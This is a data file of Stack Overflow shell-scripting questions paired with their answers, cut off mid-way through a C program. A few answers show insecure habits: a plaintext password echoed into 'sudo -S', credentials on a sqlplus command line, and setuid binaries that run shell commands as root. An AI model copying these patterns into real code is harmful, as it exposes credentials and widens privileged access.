    "Why is \"[[ 10 < 2 ]]\" true when comparing numbers in bash? [duplicate]": "Because you compare strings according to Lexicographical order and not numbers\nYou may use [[ 10 -lt 2 ]] and [[ 20 -lt 2 ]]. -lt stands for Less than (<). For Greater than (>) -gt notation can be used instead.\nIn bash double parenthesis can be used as well for performing numeric comparison:\nif ((10 < 2)); then echo \"yes\"; else echo \"no\"; fi\nThe above example will echo no",
    "Multi-line variables remove new line character - Fish": "fish splits command substitutions on newlines. This means that $lines is a list. You can read more about lists here.\nWhen you pass a list to a command, each entry in the list becomes a separate argument. echo space-separates its arguments. That explains the behavior you're seeing.\nNote that other shells do the same thing here. For example, in bash:\nlines=$(cat .lorem)\necho $lines\nIf you want to prevent the splitting, you can temporarily set IFS to empty:\nbegin\n   set -l IFS\n   set lines (cat .lorem)\nend\necho $lines\nnow $lines will contain newlines.\nAs faho says, read can also be used and is a little shorter:\nread -z lines < ~/.lorem\necho $lines\nbut consider whether splitting on newlines might actually be what you want. As faho hinted, your sed script can be replaced with array slices:\nset lines (cat .lorem)\necho $lines[2..4] # prints lines 2 through 4",
    "Difference between braces {} and brackets () in shell scripting": "Minor nitpick first:\nBrackets []\nParentheses ()\nBraces {}\n(Double) Quotation marks \"\"\n(Single) Quotation marks (apostrophes) ''\nBackticks `` (Same as the tilde ~ key)\nBraces are used in BASh scripts for complex variable expansion. Consider string concatenation:\nSTR=\"hello\"\nSTR2=$STR\nSTR2 evaluates to \"hello\". What if you wanted to make it something like \"helloWorld\". Doing something like STR2=\"$STR2World\" won't work, so you use braces, ie: STR2=\"${STR}World\".\nAs for brackets, they are used, similar to the backtick, `, which expands the text between them as the text output from a command.\nWhat if you wanted to store the current time as a string?\nSTR2=$(date)\nNow STR2 stores the string \"Thu May 7 09:32:06 PDT 2015\".\nAdditionally, you can use parentheses to execute something in a subshell, which will potentially affect your environment, PID, etc. Very useful for cases where you want a \"throwaway\" environment with having to track/restore environment variables, directories via pushd/popd instead of cd, etc.",
    "Using Python to open a shell environment, run a command and exit environment": "As I understand you want to run a command and then pass it other commands:\nfrom subprocess import Popen, PIPE\n\np = Popen(\"/path/to/env.sh\", stdin=PIPE)   # set environment, start new shell\np.communicate(\"python something.py\\nexit\") # pass commands to the opened shell",
    "Creating a sequence of distinct random numbers within a certain range in bash script": "Use shuf -i to generate a random list of numbers.\n$ entries=($(shuf -i 0-149 -n 15))\n$ echo \"${entries[@]}\"\n55 96 80 109 46 58 135 29 64 97 93 26 28 116 0\nIf you want them in order then add sort -n to the mix.\n$ entries=($(shuf -i 0-149 -n 15 | sort -n))\n$ echo \"${entries[@]}\"\n12 22 45 49 54 66 78 79 83 93 118 119 124 140 147\nTo loop over the values, do:\nfor entry in \"${entries[@]}\"; do\n    echo \"$entry\"\ndone",
    "How to activate python virtual environment by shell script [duplicate]": "Your activation script path, ve/bin/activate, is relative. The script will only work from one directory. But the problem is not here.\nWhat does bin/activate do? It modifies the shell in which it runs. This is why you have to source it and not invoke as a regular program.\nThe script you wrote starts its own copy of shell (bash), activates the virtual environment inside it, and exits, destroying the just-activated environment. If your script invoked Python after sourcing the bin/activate, it would be the Python from the virtual environment, not the system one.\nIf you want a simple, easy-to-type command to activate a virtualenv, define a shell function:\nve() { source $1/bin/activate; }\n(Yes, type the above line right into your shell prompt.)\nThen type ve foo and virtualenv named foo will be activated in your current shell, provided that you're in the right directory.\nShould you need to cope with a massive amount of virtualenvs, take a look at virtualenvwrapper.",
    "How to assign an associative array to another variable in zsh?": "You have to delve into the wonderful world of parameter expansion flags :) The k and v flags can be used together to force an associative array to expand to both its keys and values.\n$ typeset -A orig\n$ orig=(key1 val1 key2 val2)\n$ print ${(kv)orig}\nkey1 val1 key2 val2\nThen you can use the set command to populate your copy with the alternating key/values produced by that expansion.\n$ typeset -A other\n$ set -A other ${(kv)orig}\n$ print $other[key1]\nval1\nThese and other flags are documented in man zshexpn under \"Parameter Expansion Flags\", which is one of my favorite zsh features.",
    "Merge Multiple .sql Table Dump Files Into A Single File": "There are no special tools to do this. You can simply concatenate the files:\n$ cat b1.sql b2.sql b3.sql > b_all.sql\nExcept that the typical content of these .sql files is a DROP TABLE, then a CREATE TABLE, then a lot of INSERT statements. If each of the individual dump files is formatted like that, then if you restore them in sequence, each will DROP TABLE and erase the data imported by the preceding file.\nYou can create a dump file without the DROP/CREATE statements:\n$ mysqldump --no-create-info <database> <table> ...\nBut if you have the dump files already (can't re-dump them), and you want to get rid of the DROP/CREATE statements in all but the first file:\n$ ( cat b1.sql ; cat b2.sql b3.sql | sed -e '/^DROP TABLE/,/^-- Dumping data/d' ) > b_all.sql",
    "how to make SSH command execution to timeout": "You could wrap the call to ssh using the timeout command. The timeout command exits with code 124 if a timeout occurs.\ntimeout 10s ssh -q harigm@8.19.71.238 exit\nif [ $? -eq 124 ]; then\n    echo \"Timeout out\"\nfi\nOr, as Vorsprung has commented on your question (as I was looking up the man page!):\nssh -oPasswordAuthentication=no -q harigm@8.19.71.238 exit\nwhich will disallow interactive password authentication. You'd then have to check the exit code.",
    "How to delete the rows that start with \"C\" with awk?": "If data is in file data.txt, then\nWith awk:\nawk '!/^C/' data.txt\nWith grep:\ngrep -v ^C data.txt \nDisplay all lines without \"C\" at the start.\n^C means to match letter \"C\" at start of line. ! in awk, and -v in grep negate the match.",
    "sorting in shell script": "First split the array elements into lines (most *nix programs work with lines only):\nfor el in \"${arr[@]}\"\ndo\n    echo \"$el\"\ndone\nThen sort the lines:\nfor el in \"${arr[@]}\"\ndo\n    echo \"$el\"\ndone | sort\nNow you can assign that to an array again:\narr2=( $(\n    for el in \"${arr[@]}\"\n    do\n        echo \"$el\"\n    done | sort) )\nBingo:\n$ echo \"${arr2[@]}\"\nx11 x21 x31 y12 y22 y32\nTo understand how all this works, and how to change it if it doesn't do precisely what you want, have a look at the man pages:\nman bash\nman sort\nSee also How to sort an array in BASH.",
    "Calling Java Methods from Shell Scripts": "You can only call the main method. Design your main method such that it calls the method you want.\nWhen I say call main method, you don't explicitly invoke it. It's the only entry point to a java program when you invoke it.\nIf your class looks like:\npackage com.foo;\n\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(\"Hello World!\");\n    }\n}\nYou can use the following command line to invoke the main from within the directory where you can find com/foo/Test.class (If you're in the classes directory in the structure shown far below):\njava com.foo.Test\nIf you want to do so from a different (See the directory structure far below) directory, then you'll have to set classpath.\njava -cp /path/to/classes com.foo.Test\nAssume the below directory structure for clarity.\n-path\n    -to\n        -classes\n            -com\n                -foo\n                    >Test.class",
    "OS X terminal command to resolve path of an alias": "I had this problem and so I've implemented a command-line tool. It's open source at https://github.com/rptb1/aliasPath\nThe key thing is that it will work even if the alias is broken, unlike any AppleScript solution I've found. You can therefore use it to write scripts to fix aliases when lots of files change volume. That's why I wrote it.\nThe source code is very short, but here's a summary of the key part, for anyone else needing to solve this problem in code, or who wants to look up the relevant protocols.\nNSString *aliasPath = [NSString stringWithUTF8String:posixPathToAlias];\nNSURL *aliasURL = [NSURL fileURLWithPath:aliasPath];\nNSError *error;\nNSData *bookmarkData = [NSURL bookmarkDataWithContentsOfURL:aliasURL error:&error];\nNSDictionary *values = [NSURL resourceValuesForKeys:@[NSURLPathKey]\n                                   fromBookmarkData:bookmarkData];\nNSString *path = [values objectForKey:NSURLPathKey];\nconst char *s = [path UTF8String];",
    "Android: Permission denied for /data/local/tmp/*": "",
    "How to run SQL in shell script": "#!/bin/ksh\nvariable1=$( \necho \"set feed off\nset pages 0\nselect count(*) from table;\nexit\n\"  | sqlplus -s username/password@oracle_instance\n)\necho \"found count = $variable1\"",
    "Does $! mean something in shell scripting": "In addition to other answer, this echo\necho $!\nWill print blank if you haven't yet run any process in background in current shell. If you now run:\ndate &\necho $!\nThen it will print something like (i.e. process id of last executed background process):\n47833",
    "Cygwin Terminal: FTP Connection (Password Input doesn't end) [closed]": "You're probably running the ftp command that comes with Windows, which doesn't work correctly in a Cygwin terminal. You can install the inetutils package to get Cygwin's own ftp client.",
    "is it possible to use variables in remote ssh command?": "In this example\nssh my_server \"echo this is my_server; abc=2;\"\nabc is set on the remote side, so it should be clear why it is not set on your local machine.\nIn the next example,\nssh my_server \"echo this is my_server; abc=2; echo abc is $abc\"\nyour local shell tries to expand $abc in the argument before it is ever sent to the remote host. A slight modification would work as you expected:\nssh my_server 'echo this is my_server; abc=2; echo abc is $abc'\nThe single quotes prevent your local shell from trying to expand $abc, and so the literal text makes it to the remote host.\nTo finally address your real question, try this:\njabref_dir=$( ssh my_server 'jabref_exe=$(which jabref); jabref_dir=$(dirname $jabref_exe);\n               java -jar $jabref_dir/../jabref.jar > /dev/null; echo $jabref_dir' )\nThis will run the quoted string as a command on your remote server, and output exactly one string: $jabref_dir. That string is captured and stored in a variable on your local host.",
    "E138: Can't write viminfo file $HOME/.viminfo [closed]": "Fix your home directory owner and permissions.\nsudo chown -R test /home/test\n\nsudo chmod u+rw -R /home/test\nAnd finally check that no old temp files were left behind (e.g. ~/.viminf*) and that you can write in the directory of the .viminfo file.",
    "Read common name from .pem file": "First off, the .pem extension only refers to the type of encoding used in the file.\nThe common name would be a feature of the Subject or Issuer of a certificate, and can be recognised by the lines\n$ grep CERTIFICATE f.pem\n-----BEGIN CERTIFICATE-----\n-----END CERTIFICATE-----\nand lots of base64 encoded text in between.\nIf the .pem file contains an x509 certificate, this should do the trick:\nopenssl x509 -in cacert.pem -noout -text\nThis will dump the whole certificate. The openssl x509 command has several options to suppress the fields you don't want to see. You find those explained in the man page, under TEXT OPTIONS\nYou can also choose to get shown just the 'Subject' of the certificate:\nopenssl x509 -in cacert.pem -noout -subject\nExample:\nLet's capture the certificate of stackoverflow.com straight from the server\n$ : | openssl s_client -connect stackoverflow.com:443 > f.pem 2>& 1 &&\n      openssl x509 -in f.pem -noout -subject 2>& 1\nOutputs:\nSubject: CN = *.stackexchange.com",
    "Cakephp shell :Shell class HelloShell could not be found": "there is your mistake. you should always be in your APP path to execute the cake console.\n...app/>../lib/Cake/Console/cake MyShell\nor (using the APP Console folder):\n...app/>Console/cake MyShell\nand MyShell should then be in ...app/Console/Command/. Thats all there is to it.",
    "How to make special characters in a Bash script for conky?": "All non-control sequences of bytes your script outputs to the terminal are interpreted for display according to the terminal's settings. If you configure it to interpret incoming data as utf-8 then all you need to do in your bash script is output the Celsius character as required by utf-8.\nSetting your terminal right depends on the application you're using. It is quite likely that it is already in utf-8 mode.\nIn order to display the character you want you need to look up its Unicode codepoint and encode it in utf-8 or you can look it up somewhere where character's utf-8 sequence is already shown. Celsius character is described here for example.\nCelsius utf-8 sequence is 0xE2 0x84 0x83, so you can display it in your shell using the $'string' construct since it accepts the \\xhh escape:\n$ echo $'\\xe2\\x84\\x83'\n\u2103\nor echo with -e:\n$ echo -e '\\xe2\\x84\\x83'\n\u2103\nAlso, you can assign it to a variable\n$ CEL=$'\\xe2\\x84\\x83'\n$ echo $CEL\n\u2103\nIf you wish to display \u2103 as two separate characters: degree character and the C letter then you can use this character and this command:\n$ echo $'\\xc2\\xb0'C\n\u00b0C\nIf you're using a shell which doesn't support the $'string' construct, you can also use utilities like perl or python:\n$ python -c 'print \"\\xe2\\x84\\x83\"'\n\u2103\n$ perl -e 'print \"\\xe2\\x84\\x83\\n\"'\n\u2103\nIn GNU awk you can use standard C language escapes including \\xhh, for example:\n$ awk 'BEGIN { print \"\\xe2\\x84\\x83\"; }' \n\u2103\n$ awk 'BEGIN { print \"\\xc2\\xb0\\C\"; }' \n\u00b0C\nNote that an extra backslash was needed to terminate the hexadecimal number (without it the escape sequence consumes all hexadecimal digits including letter C, see GNU awk user's guide).\nMore portable solution in awk is to use octal sequence. Since hexadecimal 0xC2 is octal 302 and hexadecimal 0xB0 is octal 260, you can do the following:\n$ awk 'BEGIN { print \"\\302\\260C\"; }'\n\u00b0C\nSimilarly,\n$ awk 'BEGIN { print \"\\342\\204\\203\"; }'\n\u2103",
    "values of true and false in shell": "The test if [ 0 ] tests whether 0 is the empty string (it isn't) and returns true if it is not empty. The test if [ 1 ] similarly tests whether 1 is the empty string and returns true if it is not empty. Likewise, the other two tests check whether the strings true and false are empty...\nIf you want to test the commands, execute the commands:\nif false; then echo False is true; else echo False is false; fi\nif true ; then echo True  is true; else echo True  is false; fi\nMost machines don't have commands called 0 or 1, so you can't readily invoke them as commands.\nYou could also experiment with:\nif sh -c \"exit 1\"; then echo Shell exited as true; else echo Shell exited as false; fi\nif sh -c \"exit 0\"; then echo Shell exited as true; else echo Shell exited as false; fi\nIn 7th Edition Unix, /bin/test (or possibly /usr/bin/test) was the test program, but you would normally find a link /bin/[. When it was invoked by the name [, it demanded that its last argument was ], so you could write a square bracketed condition. (Macs with macOS 10.14.6 Mojave still have /bin/[ \u2014 it still works. Linux systems usually have /usr/bin/[, and it still works too.)\nShortly after that, the test operation was built into the shell, instead of being a separate executable, but the semantics remained largely unchanged. Because they are now different (built-in vs the executable), sometimes the test operations have different functionality. POSIX defines a baseline; various shells and systems provide various extensions.\nTo this day, the autoconf suite recommends the use of test over [, though that is primarily because it uses square brackets for another purpose.",
    "pythonrc.py is not loading in interactive mode": "You should set the Environment variable PYTHONSTARTUP to point to the start up script that you created.\nIn Ubuntu you can edit the ~/.bashrc file and add this line in the end:\nexport PYTHONSTARTUP=~/.pythonrc.py\nNow you should start a new shell and run python.\nHope it helps :)",
    "Testing for color support in Linux shell scripts": "You can use tput colors.\nFor my terminal with TERM=xterm-256colors the output is [drumroll] 256! Here are some other examples:\n$ TERM=vt100 tput colors\n-1\n$ TERM=vt220 tput colors\n-1\n$ TERM=linux tput colors\n8\n$ TERM=cons25 tput colors\n8\n$ TERM=linux tput colors\n8\n$ TERM=rxvt-unicode tput colors\n88\nAlternatively tput -Tvt100 colors will also allow you to specify the terminal type you're interested in.",
    "UNIX sort: Sorting something from the clipboard": "If you type sort - the command will accept input from stdin. Then you can just paste whatever you want into the console and type CTRL-D to sort it.",
    "How read line in while loop works": "Let's analyze this fragment:\nwhile read LINE; do\n echo \"This is a downvote\"\ndone < inputfile\nThis is the compound command while:\nwhile TESTCOMMAND; do SOMETHING; done\n(semicolons can be substituted by newlines).\nFirst of all, TESTCOMMAND is a complete command, maybe composed of many words - this is why it is ended by a semicolon or a newline. For example, TESTCOMMAND coud be \"tail file.txt | grep bye\": these are many words, and actually two commands are run instead, with a pipe in between.\nFor every iteration, TESTCOMMAND is run and, if it succeeds, the commands between do and done (the SOMETHING part) are executed. If TESTCOMMAND fails, the loop is exited.\nNow, let see the case when TESTCOMMAND is read LINE. Before execution, the two words read and LINE simply mean what they are: two words, the first is read and the second is LINE. The first word will be the name of the command to be executed; all the others will be argument for the command. So, you see, LINE is a word with no special meaning, it is not a variable - its content is not even evaluated (in order to evaluate it before the execution of the command, we would write \"$LINE\").\nThen the command read is executed. It is that command, read, that interprets its argument LINE as a variable name to write to. Other commands could interpret that word (LINE) as a file name, or a textual word, or whatever they want.\nThe last line of the fragment, done < inputfile says that the command must have its (standard) input redirected: the command will not read the standard input (which in many cases is the console), but the file specified (inputfile in this case).\nWhat is the command the redirection applies to? It is the while command, and all its \"children\". Do not get confused by the fact that the redirection symbol < seems far from the keyword while. The shell sees while, and knows that there is a corresponding done later.\n--- update after comment request ---\nMore or less the execution of these lines:\nwhile read LINE; do\n echo \"This is a downvote\"\ndone < inputfile\ngoes like this (assuming that inputfile contains 3 lines):\nthe shell finds the while and parses it until the done\na redirection is found, so standard input is redirected\nthe cycle begins\nread LINE is executed, variable LINE is filled with the first line read from inputfile, and the read command returns \"success\"\n...so the body, echo ... is executed\nthe done keyword restarts the cycle\nread LINE and echo ... is executed two more times\nwhen trying to read the fourth line from inputfile, the read command fails (end of file) and returns fail\nthe while cycle breaks (jumps to finalization)\n...the finalization says to reset the standard input\nthe execution of the rest of the script continues.",
    "How can we get weekday based on given date in unix": "Very simple. Just use the date command itself with correct options.\n$ date -j -f '%m-%d-%Y' \"09-01-2017\" +'%A'\nFriday",
    "How do I manage log verbosity inside a shell script?": "Improving on @Fred's idea a little bit more, we could build a small logging library this way:\ndeclare -A _log_levels=([FATAL]=0 [ERROR]=1 [WARN]=2 [INFO]=3 [DEBUG]=4 [VERBOSE]=5)\ndeclare -i _log_level=3\nset_log_level() {\n  level=\"${1:-INFO}\"\n  _log_level=\"${_log_levels[$level]}\"\n}\n\nlog_execute() {\n  level=${1:-INFO}\n  if (( $1 >= ${_log_levels[$level]} )); then\n    \"${@:2}\" >/dev/null\n  else\n    \"${@:2}\"\n  fi\n}\n\nlog_fatal()   { (( _log_level >= ${_log_levels[FATAL]} ))   && echo \"$(date) FATAL  $*\";  }\nlog_error()   { (( _log_level >= ${_log_levels[ERROR]} ))   && echo \"$(date) ERROR  $*\";  }\nlog_warning() { (( _log_level >= ${_log_levels[WARNING]} )) && echo \"$(date) WARNING  $*\";  }\nlog_info()    { (( _log_level >= ${_log_levels[INFO]} ))    && echo \"$(date) INFO   $*\";  }\nlog_debug()   { (( _log_level >= ${_log_levels[DEBUG]} ))   && echo \"$(date) DEBUG  $*\";  }\nlog_verbose() { (( _log_level >= ${_log_levels[VERBOSE]} )) && echo \"$(date) VERBOSE $*\"; }\n\n# functions for logging command output\nlog_debug_file()   { (( _log_level >= ${_log_levels[DEBUG]} ))   && [[ -f $1 ]] && echo \"=== command output start ===\" && cat \"$1\" && echo \"=== command output end ===\"; }\nlog_verbose_file() { (( _log_level >= ${_log_levels[VERBOSE]} )) && [[ -f $1 ]] && echo \"=== command output start ===\" && cat \"$1\" && echo \"=== command output end ===\"; }\nLet's say the above source is in a library file called logging_lib.sh, we could use it in a regular shell script this way:\n#!/bin/bash\n\nsource /path/to/lib/logging_lib.sh\n\nset_log_level DEBUG\n\nlog_info  \"Starting the script...\"\n\n# method 1 of controlling a command's output based on log level\nlog_execute INFO date\n\n# method 2 of controlling the output based on log level\ndate &> date.out\nlog_debug_file date.out\n\nlog_debug \"This is a debug statement\"\n...\nlog_error \"This is an error\"\n...\nlog_warning \"This is a warning\"\n...\nlog_fatal \"This is a fatal error\"\n...\nlog_verbose \"This is a verbose log!\"\nWill result in this output:\nFri Feb 24 06:48:18 UTC 2017 INFO    Starting the script...\nFri Feb 24 06:48:18 UTC 2017\n=== command output start ===\nFri Feb 24 06:48:18 UTC 2017\n=== command output end ===\nFri Feb 24 06:48:18 UTC 2017 DEBUG   This is a debug statement\nFri Feb 24 06:48:18 UTC 2017 ERROR   This is an error\nFri Feb 24 06:48:18 UTC 2017 WARNING   This is a warning\nFri Feb 24 06:48:18 UTC 2017 FATAL   This is a fatal error\nAs we can see, log_verbose didn't produce any output since the log level is at DEBUG, one level below VERBOSE. However, log_debug_file date.out did produce the output and so did log_execute INFO, since log level is set to DEBUG, which is >= INFO.\nUsing this as the base, we could also write command wrappers if we need even more fine tuning:\ngit_wrapper() {\n  # run git command and print the output based on log level\n}\nWith these in place, the script could be enhanced to take an argument --log-level level that can determine the log verbosity it should run with.\nHere is a complete implementation of logging for Bash, rich with multiple loggers:\nhttps://github.com/codeforester/base/blob/master/lib/stdlib.sh\nIf anyone is curious about why some variables are named with a leading underscore in the code above, see this post:\nCorrect Bash and shell script variable capitalization",
    "how to pass in a variable to awk commandline": "With awk, you should declare the variable before use it. This is better than the escape method (awk '{print $'$var'}'):\nawk -v var1=\"$col1\" -v var2=\"$col2\" 'BEGIN {print var1,var2 }'\nWhere $col1 and $col2 would be the input variables. Maybe you can try an input variable as string with \"$2,$4,$5\" and print this variable to get the values (I am not sure if this works)",
    "Loop inside \"heredoc\" in shell scripting": "Instead of passing a here-document to utilityExecutable, the equivalent is to pipe the required text to it. You can create the desired text using echo statements in a for-loop, and pipe the entire loop output to utilityExecutable:\n#!/bin/sh\n\nlist=\"OBJECT1 OBJECT2 OBJECT3\"\n\nfor i in $list; do\n    echo \"utilityCommand $i\"\ndone | utilityExecutable",
    "Compare file sizes in shell script": "this works on bash\nif((`stat -c%s \"$file1\"`==`stat -c%s \"$file2\"`));then\n  echo \"do something\"\nfi",
    "What are the alternative(s) to applescript in Linux? How are they different?": "Many Linux applications provide basic UI interactions from the command-line.\nFor those that don't do quite what you'd like you might try some UI automation tools such as:\nstrongwind or dogtail -- accessibility based UI automation\nXpresser or Sikuli -- screen recognition based UI automation",
    "Is there any mechanism in Shell script alike \"include guard\" in C++?": "If you're sourcing scripts, you are usually using them to define functions and/or variables.\nThat means you can test whether the script has been sourced before by testing for (one of) the functions or variables it defines.\nFor example (in b.sh):\nif [ -z \"$B_SH_INCLUDED\" ]\nthen\n    B_SH_INCLUDED=yes\n    ...rest of original contents of b.sh\nfi\nThere is no other way to do it that I know of. In particular, you can't do early exits or returns because that will affect the shell sourcing the file. You don't have to use a name that is solely for the file; you could use a name that the file always has defined.",
    "What is '$$' in the bash shell?": "It's the process id of the bash process itself.\nYou might use it to track your process over its life - use ps -p to see if it's still running, send it a signal using kill (to pause the process for example), change its priority with renice, and so on.\nProcess ids are often written to log files, especially when multiple instances of a script run at once, to help track performance or diagnose problems.\nHere's the bash documentation outlining special parameters.\nBASHPID, mentioned by ghostdog74, was added at version 4.0. Here's an example from Mendel Cooper's Advanced Bash-Scripting Guide that shows the difference between $$ and $BASHPID:\n#!/bin/bash4\n\necho \"\\$\\$ outside of subshell = $$\" # 9602\necho \"\\$BASH_SUBSHELL outside of subshell = $BASH_SUBSHELL\" # 0\necho \"\\$BASHPID outside of subshell = $BASHPID\" # 9602\necho\n\n( echo \"\\$\\$ inside of subshell = $$\" # 9602\necho \"\\$BASH_SUBSHELL inside of subshell = $BASH_SUBSHELL\" # 1\necho \"\\$BASHPID inside of subshell = $BASHPID\" ) # 9603\n# Note that $$ returns PID of parent process.",
    "How to safely escape a string from C++": "Other answers include this fork and exec solution, but I claim that this is the only right way to do it.\nEscaping shell arguments is prone to bugs and a waste of time, just as trying to escape SQL parameters is a silly idea when safer and more efficient parameter binding APIs exist.\nHere is a sample function:\nvoid play(const char *path)\n{\n    /* Fork, then exec */\n    pid = fork();\n\n    if( pid < 0 ) { \n        /* This is an error! */\n        return;\n    }   \n\n    if( pid == 0 ) { \n        /* This is the child */\n        freopen( \"/dev/null\", \"r\", stdin );\n        freopen( \"/dev/null\", \"w\", stdout );\n        freopen( \"/dev/null\", \"w\", stderr );\n\n        execlp( \"mplayer\", \"mplayer\", path, (char *)0 );\n        /* This is also an error! */\n        return;\n    }\n}",
    "How to check jq result is null or not?": "Where is the error?\nReplace\n[ -z \"${VAR2}\" ]\nwith\n[ \"${VAR2}\" = \"null\" ]\nbecause jq returns string null if var2 is not found in JSON file.\nOr use --exit-status:\nif echo \"$JSON_INPUT\" | jq --exit-status '.var2' >/dev/null; then \n  echo \"exists\"\nelse\n  echo \"does not exist\"\nfi",
    "How to call a function (defined in shell script) in a Perl script": "To invoke a shell function, the shell needs to know its definition. One way to achieve that is to have the shell first source the file which defines the function. And then, without exiting the shell, call the function. From a Perl script, that would be for example:\nsystem 'bash', '-c', 'source shell_script.sh; func_1';",
    "xargs sh -c skipping the first argument": "First argument to sh -c or bash -c is the name of the script i.e. $0 which is not printed when you use $@:\nExamples:\necho a b c d e f| xargs -n 3 bash -c 'echo \"$0 $@\"'\na b c\nd e f\nTo fix this you can pass _ as dummy name of the script and then it should work:\necho a b c d e f| xargs -n 3 bash -c 'echo \"$@\"' _\na b c\nd e f\nIt will work fine even with your sleep example:\necho a b c d e f| xargs -n 3 bash -c 'echo \"$@\"; sleep 1' _\na b c\nd e f",
    "Portably trapping ERR in shell script": "You can trap on exit and test the exit code like this:\nset -e\ntrap '[ $? -eq 0 ] && exit 0 || echo \"$0 FAILED at line ${LINENO}\"' EXIT",
    "arithmetic expression: expecting primary:": "You seem to be running that script using dash instead of bash, possibly because you're invoking the script as\nsh prueba.sh\ninstead of\n# prueba.sh must have exec permissions\n# the shebang line is used to select the interpreter\n./prueba.sh\nor\nbash prueba.sh\nRANDOM is a bash extension; in dash, it is not special and not assigned by default.\nIn an arithmetic expression, if $var is used and var is unassigned, then it is substituted with an empty string, which often creates a syntax error. On the other hand, if you use var and var has not been assigned a value, it is assumed to be 0.\nDebian and Ubuntu installs typically use dash for the /bin/sh default shell interpreter.\nNote that bash and dash produce different error messages:\n$ bash -c 'unset foo;bar=25;echo $(($foo*$bar))'\nbash: *25: syntax error: operand expected (error token is \"*25\")\n$ dash -c 'unset foo;bar=25;echo $(($foo*$bar))'\ndash: 1: arithmetic expression: expecting primary: \"*25\"",
    "Need to split a string in Bash separated by a colon and assign to variables": "Use IFS=: before read:\ns='Strings:With:Four:Words'\nIFS=: read -r var1 var2 var3 var4 <<< \"$s\"\necho \"[$var1] [$var2] [$var3 [$var4]\"\n[Strings] [With] [Four [Words]",
    "Bash Completion script to complete file path after certain arguments options": "You can use compgen -f to complete filenames, like this:\nif [[ ${prev} == --*file ]] || [[ ${prev} == --out ]]; then\n    COMPREPLY=( $(compgen -f -- ${cur}) )\nelif ...\nHowever, compgen -f isn't great at completing filenames because it doesn't honour spaces in filenames.\nA better way is to use the _filedir function available in bash-completion-lib. It might already be available on your system (type: declare -f _filedir to check).\nUsing _filedir, your completion function becomes:\nif [[ ${prev} == --*file ]] || [[ ${prev} == --out ]]; then\n    _filedir\nelif ...",
    "How to execute complex linux commands in Qt? [duplicate]": "The key methods that exist for this purpose established in QProcess:\nvoid QProcess::setProcessChannelMode(ProcessChannelMode mode)\nand\nvoid QProcess::setStandardOutputProcess(QProcess * destination)\nTherefore, the following code snippet would be the equivalence of command1 | command2 without limiting yourself to one interpreter or another:\nQProcess process1\nQProcess process2;\n\nprocess1.setStandardOutputProcess(&process2);\n\nprocess1.start(\"echo myPass\");\nprocess2.start(\"sudo -S shutdown -r now\");\nprocess2.setProcessChannelMode(QProcess::ForwardedChannels);\n\n// Wait for it to start\nif(!process1.waitForStarted())\n    return 0;\n\nbool retval = false;\nQByteArray buffer;\n// To be fair: you only need to wait here for a bit with shutdown,\n// but I will still leave the rest here for a generic solution\nwhile ((retval = process2.waitForFinished()));\n    buffer.append(process2.readAll());\n\nif (!retval) {\n    qDebug() << \"Process 2 error:\" << process2.errorString();\n    return 1;\n}\nYou could drop the sudo -S part because you could run this small program as root, as well as setting up the rights. You could even set setuid or setcap for the shutdown program.\nWhat we usually do when building commercial Linux systems is to have a minimal application that can get setuid or setcap for the activity it is trying to do, and then we call that explicitly with system(3) or QProcess on Linux. Basically,\nI would write that small application to avoid giving full root access to the whole application, so to restrict the access right against malicious use as follows:\nsudo chmod u+s /path/to/my/application",
    "Adding XML element in XML file using sed command in shell script": "change this:\nCONTENT=\"<student>\n            <name>NewName</name>\n            <id>NewID</id>\n        </student>\"\nto this:\nCONTENT=\"<student>\\n<name>NewName</name>\\n<id>NewID</id>\\n</student>\"\nand then:\nC=$(echo $CONTENT | sed 's/\\//\\\\\\//g')\nsed \"/<\\/Students>/ s/.*/${C}\\n&/\" file",
    "reading a particular line from a file in bash script using variable as line number": "You pretty much have it.\nline=$(sed -n \"${lineno}p\" \"$file\")",
    "Check if a command exists in Bash (including superusers)": "Source of the problem\nThe reason the commands you tried do not work is that they only look for executables in $PATH variable. First, let's test our hypothesis.\ndummy:~$ mkdir test\ndummy:~$ cd test\ndummy:~/test$ echo '#!/bin/sh' >test.sh\ndummy:~/test$ chmod +x test.sh\ndummy:~/test$ cd\ndummy:~$ command -v test.sh\ndummy:~$ PATH+=:/home/dummy/test/\ndummy:~$ command -v test.sh\n/home/dummy/test/test.sh\nThis confirms my statement above.\nNow, let's have a look what $PATH looks like for different users:\ndummy:~$ echo $PATH\n/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\ndummy:~$ su\nroot:~# echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSo in order to check whether given command is available to given user (in your question, namely: root), you need to know his $PATH environment variable.\nThe solution\nValues of such environment variables on Debian can be usually found in /etc/profile and in /etc/environment/ files. There is no easy way to get these values by fishing them out of files.\nThe most basic solution is to temporarily add known directories to your $PATH variable and then use command -v:\ndummy~$ OLDPATH=$PATH\ndummy~$ PATH=$OLDPATH:/sbin:/usr/sbin/:/usr/local/sbin/\ndummy~$ command -v poweroff\n/sbin/poweroff\ndummy~$ PATH=$OLDPATH\nThere is one problem with this solution: if you want to be portable, you don't really know what are the folders that you should concatenate. In most cases this approach should be sufficient, though.\nAlternative solution\nWhat you can do instead is to write a script program that makes use of setuid bit. Setuid bit is a somewhat hidden feature of Linux operating systems that allows programs to be executed on their owner privileges. So you write a program that executes some commands like superuser would, except that it can be run by normal users. That way you can see output of command -v poweroff like a root would do.\nUnfortunately, stuff that uses shebang can't have setuid bit, so you cannot create a shell script for this and you need a program in C. Here's an example program that would do the job:\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(int argc, char** argv)\n{\n    if (argc <= 1)\n    {\n        fprintf(stderr, \"No arguments.\\n\");\n        return 1;\n    }\n\n    //validate the argv\n    char* prog = argv[1];\n    int i;\n    for (i = 0; i < strlen(prog); i ++)\n    {\n        if (prog[i] < 'a' || prog[i] > 'z')\n        {\n            fprintf(stderr, \"%s contains invalid characters (%c), exiting.\", prog, prog[i]);\n            return 1;\n        }\n    }\n\n    //here's the `which` command. We start it in new interactive shell,\n    //since this program inherits environment variables from its\n    //parent shell. We need to start *new* shell that will initialize\n    //and overwrite existing PATH environment variable.\n    char* command = (char*) malloc(strlen(prog) + 30);\n    if (!command)\n    {\n        fprintf(stderr, \"No memory!\\n\");\n        return 1;\n    }\n    sprintf(command, \"bash -cli 'command -v %s'\", prog);\n\n    int exists = 0;\n    //first we try to execute the command as a dummy user.\n    exists |= system(command) == 0;\n    if (!exists)\n    {\n        //then we try to execute the command as a root user.\n        